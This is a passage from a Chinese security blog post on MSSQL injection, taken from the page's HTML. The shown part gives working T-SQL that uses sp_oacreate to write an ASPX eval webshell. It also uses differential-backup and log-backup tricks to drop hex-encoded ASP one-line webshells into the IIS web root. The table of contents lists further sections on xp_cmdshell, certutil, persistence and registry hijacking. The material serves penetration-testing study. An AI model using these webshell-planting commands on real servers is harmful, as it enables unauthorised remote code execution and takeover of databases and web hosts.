+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @f int,@g int</span><br><span class="line">exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output</span><br><span class="line">EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\inetpub\wwwroot\shell.aspx&#x27;,1</span><br><span class="line">EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var a = &quot;un&quot;;var b = &quot;safe&quot;;Response.Write(eval(Request.Item[&quot;z&quot;],a+b));%&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210915145514404.png" alt="image-20210915145514404"></p>
+<p>至此sp_oacreate 基本总结完毕，剩余的后期在进行补充，下面开始对常见的getshell方式进行总结</p>
+<h2 id="MSSQL-GETSHELL"><a href="#MSSQL-GETSHELL" class="headerlink" title="MSSQL GETSHELL"></a>MSSQL GETSHELL</h2><p>上面已经总结了部分getshell的方式，这里主要想说一下日志getshell的方式，主要包括差异备份getshell以及log文件getshell两种！开始吧</p>
+<h3 id="差异备份getshell"><a href="#差异备份getshell" class="headerlink" title="差异备份getshell"></a>差异备份getshell</h3><p>1.首先需要完整的备份一下我们的数据库，以mssqllibs数据库为例</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup database mssqllibs to disk=&#x27;C:\inetpub\wwwroot\mssql.bak&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>2.创建一个新表</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table cmd (a image);</span><br></pre></td></tr></table></figure>
+
+<p>3.插入数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into cmd values(0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line"><span class="meta">#</span><span class="bash">values的值为&lt;%execute(request(<span class="string">&quot;a&quot;</span>))%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>4.重新备份文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup database mssqllibs to disk=&#x27;C:\inetpub\wwwroot\hhh.asp&#x27; WITH DIFFERENTIAL,FORMAT;</span><br></pre></td></tr></table></figure>
+
+<p>sql server 2008复现失败</p>
+<h3 id="log备份getshell"><a href="#log备份getshell" class="headerlink" title="log备份getshell"></a>log备份getshell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alter database testdb set RECOVERY FULL </span><br><span class="line">backup database testdb to disk = &#x27;c:\bak.bak&#x27;</span><br><span class="line">create table cmd (a image) </span><br><span class="line">backup log testdb to disk = &#x27;c:\aaa.bak&#x27; with init </span><br><span class="line">insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line"><span class="meta">#</span><span class="bash">一句话密码是a</span></span><br><span class="line">backup log testdb to disk = &#x27;C:\inetpub\wwwroot\shell.asp&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210915162732303.png" alt="image-20210915162732303"></p>
+<p>至此，mssql的利用总结完毕，部分的实验由于环境原因没有复现成功，后期实战遇到了在进行补充！</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>【1】<a target="_blank" rel="noopener" href="https://paper.seebug.org/1525/#sql-server_2">https://paper.seebug.org/1525/#sql-server_2</a></p>
+<p>【2】<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8603">https://xz.aliyun.com/t/8603</a></p>
+<p>【3】<a target="_blank" rel="noopener" href="https://y4er.com/post/mssql-getshell/">https://y4er.com/post/mssql-getshell/</a></p>
+<p>【4】<a target="_blank" rel="noopener" href="http://www.feidao.site/wordpress/?p=2451#shell">http://www.feidao.site/wordpress/?p=2451#shell</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">木鱼</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://top7.top/posts/49982/">http://top7.top/posts/49982/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://top7.top" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://top7.top" target="_blank">木鱼</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/62300/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">mysql利用以及提权</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">MSSQL简介：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL%E8%AF%AD%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">MSSQL语法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">1.创建数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-select-%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2.select 语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-insert-into%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.3.</span> <span class="toc-text">3.insert into语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-UPDATE-%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.4.</span> <span class="toc-text">4.UPDATE 语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-DELETE-%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.5.</span> <span class="toc-text">5.DELETE 语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">MSSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AFmssql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.2.1.</span> <span class="toc-text">判断是否是mssql数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.2.2.</span> <span class="toc-text">查看版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">3.2.3.</span> <span class="toc-text">查看数据库名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">3.2.4.</span> <span class="toc-text">获取数据库名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">3.2.5.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-number">3.2.6.</span> <span class="toc-text">获取列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">3.2.7.</span> <span class="toc-text">获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA"><span class="toc-number">3.2.8.</span> <span class="toc-text">实战靶场</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.1.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">判断注入点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.3.2.</span> <span class="toc-text">猜测数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">猜测数据库长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">猜测数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">3.3.2.3.</span> <span class="toc-text">猜测表名长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="toc-number">3.3.2.4.</span> <span class="toc-text">猜解表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">3.3.2.5.</span> <span class="toc-text">猜解列名长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.3.2.6.</span> <span class="toc-text">数据查询</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.4.</span> <span class="toc-text">MSSQL 存储过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XP-cmdshell-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.4.1.</span> <span class="toc-text">XP_cmdshell 存储过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5xp-cmdshell%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">检查xp_cmdshell是否存在</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4xp-cmdshell"><span class="toc-number">3.4.1.2.</span> <span class="toc-text">删除xp_cmdshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%A2%E5%A4%8Dxp-cmdshell"><span class="toc-number">3.4.1.3.</span> <span class="toc-text">恢复xp_cmdshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AFxp-cmdshell"><span class="toc-number">3.4.1.4.</span> <span class="toc-text">开启xp_cmdshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%ADxp-cmdshell%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.4.1.5.</span> <span class="toc-text">关闭xp_cmdshell存储过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-cmdshell-%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.1.6.</span> <span class="toc-text">xp_cmdshell 查找文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-cmdshell-getshell"><span class="toc-number">3.4.1.7.</span> <span class="toc-text">xp_cmdshell getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Powershell-%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-number">3.4.1.7.1.</span> <span class="toc-text">Powershell 获取权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-number">3.4.1.7.2.</span> <span class="toc-text">写入木马获取权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#certutil-getshell"><span class="toc-number">3.4.1.7.3.</span> <span class="toc-text">certutil getshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xp-cmdshell-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">3.4.1.7.4.</span> <span class="toc-text">xp_cmdshell 持久化</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XP-dirtree-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.4.1.8.</span> <span class="toc-text">XP_dirtree 存储过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XP-regread"><span class="toc-number">3.4.1.9.</span> <span class="toc-text">XP_regread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-regenumkeys"><span class="toc-number">3.4.1.10.</span> <span class="toc-text">xp_regenumkeys</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-fileexist"><span class="toc-number">3.4.1.11.</span> <span class="toc-text">xp_fileexist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-subdirs"><span class="toc-number">3.4.1.12.</span> <span class="toc-text">xp_subdirs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-regwrite"><span class="toc-number">3.4.1.13.</span> <span class="toc-text">xp_regwrite</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#xp-regwrite-%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">3.4.1.13.1.</span> <span class="toc-text">xp_regwrite 映像劫持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xp-regwrite-%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83%EF%BC%88server-2008%E4%B8%8D%E5%8F%AF%E7%94%A8%EF%BC%89"><span class="toc-number">3.4.1.13.2.</span> <span class="toc-text">xp_regwrite 沙盒提权（server 2008不可用）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">3.5.</span> <span class="toc-text">MSSQL 触发器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">3.5.1.</span> <span class="toc-text">什么是触发器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">3.5.2.</span> <span class="toc-text">创建触发器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SP-OACREATE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.6.</span> <span class="toc-text">SP_OACREATE的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFsp-oacreate"><span class="toc-number">3.6.1.</span> <span class="toc-text">开启sp_oacreate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%ADsp-oacreate"><span class="toc-number">3.6.2.</span> <span class="toc-text">关闭sp_oacreate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-oacreate%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">3.6.3.</span> <span class="toc-text">sp_oacreate的用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%EF%BC%88%E8%B0%83%E7%94%A8wscript-shell%EF%BC%89"><span class="toc-number">3.6.3.1.</span> <span class="toc-text">执行系统命令（调用wscript.shell）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E5%B9%B6%E6%8F%90%E6%9D%83"><span class="toc-number">3.6.3.2.</span> <span class="toc-text">添加系统账户并提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">3.6.3.3.</span> <span class="toc-text">复制文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E6%96%87%E4%BB%B6"><span class="toc-number">3.6.3.4.</span> <span class="toc-text">移动文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-number">3.6.3.5.</span> <span class="toc-text">删除文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%EF%BC%88%E8%B0%83%E7%94%A8shell-application%EF%BC%89"><span class="toc-number">3.6.3.6.</span> <span class="toc-text">执行系统命令（调用shell.application）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">3.6.3.7.</span> <span class="toc-text">写入webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-GETSHELL"><span class="toc-number">3.7.</span> <span class="toc-text">MSSQL GETSHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell"><span class="toc-number">3.7.1.</span> <span class="toc-text">差异备份getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log%E5%A4%87%E4%BB%BDgetshell"><span class="toc-number">3.7.2.</span> <span class="toc-text">log备份getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">参考：</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 木鱼</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到木鱼的小屋哦！</div></div><div class="container" id="jsi-flying-fish-container"><script src="/js/fish.js"></script></div><style>   @media only screen and (max-width: 767px){
+   #sidebar_search_box input[type=text]{width:calc(100% - 24px)}
+}</style></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">2</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="/js/jq.js"></script><script data-pjax defer src="/js/fish.js"></script><script src="/js/cursor.js"></script><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script id="canvas_nest" defer="defer" color="0,200,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,和谐,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/theme_f/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/nietzche.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-20},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
